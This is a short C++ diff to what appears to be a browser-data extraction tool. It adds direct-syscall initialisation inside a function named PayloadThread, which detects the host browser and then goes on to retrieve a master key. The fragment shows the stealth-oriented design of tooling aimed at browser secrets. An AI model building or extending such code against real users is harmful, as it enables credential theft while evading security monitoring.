@@ -3,6 +3,7 @@
 
 #include "../core/common.hpp"
 #include "../sys/bootstrap.hpp"
+#include "../sys/internal_api.hpp"
 #include "pipe_client.hpp"
 #include "browser_config.hpp"
 #include "data_extractor.hpp"
@@ -55,6 +56,11 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
         auto browser = DetectBrowser();
 
         pipe.LogDebug("Running in " + browser.name);
+
+        // Initialize syscalls
+        if (!Sys::InitApi(config.verbose)) {
+            pipe.LogDebug("Warning: Syscall initialization failed.");
+        }
 
         std::vector<uint8_t> masterKey;
         {
